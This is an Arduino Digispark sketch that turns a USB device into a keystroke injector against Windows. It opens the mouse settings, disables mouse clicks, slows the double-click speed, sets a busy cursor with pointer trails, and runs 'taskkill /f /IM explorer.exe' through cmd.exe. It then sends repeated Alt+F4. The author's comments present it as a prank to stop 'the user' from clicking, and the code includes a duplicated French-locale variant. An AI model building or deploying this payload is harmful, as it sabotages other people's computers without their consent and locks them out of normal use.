#include "DigiKeyboard.h"
void setup(){}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(7, 8);
  DigiKeyboard.sendKeyStroke(41, null);
  DigiKeyboard.print("mouse");
  // this is opening up the mouse config.
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("n");
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.print("n");
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.print("n");
  // this set all of there mouse clicks to nothing (user cant click :D)
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  // this makes the double click speed area the slowest
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(79);
  // this switches over to the "pointers"
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.print("w");
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.print("b");
  // changes the cursor look to busy
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  // makes there "busy" cursor go as slow as possible
  DigiKeyboard.print("d");
  DigiKeyboard.print("s");
  // makes the cursor have a "trail" and if ctrl+clicked a "location"
  DigiKeyboard.print("a");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.sendKeyStroke(8);
  DigiKeyboard.print("task manager");
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.print("explorer");
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.print("e");
  DigiKeyboard.sendKeyStroke(40);
  // This open taskmanager, and turns of explorer (this runs windows) to get back on just ctrl+alt+dlt and goto processes and start "explorer.exe" without ""
  // Enjoy, ps if this has errors please let me know, email at Calebhutch@yahoo.com thanks :D
  DigiKeyboard.sendKeyStroke(null, null);
  DigiKeyboard.sendKeyStroke(null, null);
  DigiKeyboard.sendKeyStroke(null, null);
  // *-this is opening up the mouse config.-*
  DigiKeyboard.sendKeyStroke(null, null);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(7, 8);
  DigiKeyboard.sendKeyStroke(41, null);
  DigiKeyboard.print("Souris");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(40);
  // *-this switches over to the "pointers"-*
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(79);
  // *-changes the cursor look to busy-*
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(40);
  // *-makes there "busy" cursor go as slow as possible-*
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(80);
  // *-makes the cursor have a "trail" and if ctrl+clicked a "location"-*
  DigiKeyboard.print("h");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(200);
  // *-killing explorer.exe-*
  DigiKeyboard.sendKeyStroke(21, 8);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("taskkill /f /IM explorer.exe");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(61, 4);
  DigiKeyboard.sendKeyStroke(61, 4);
  DigiKeyboard.sendKeyStroke(61, 4);
}
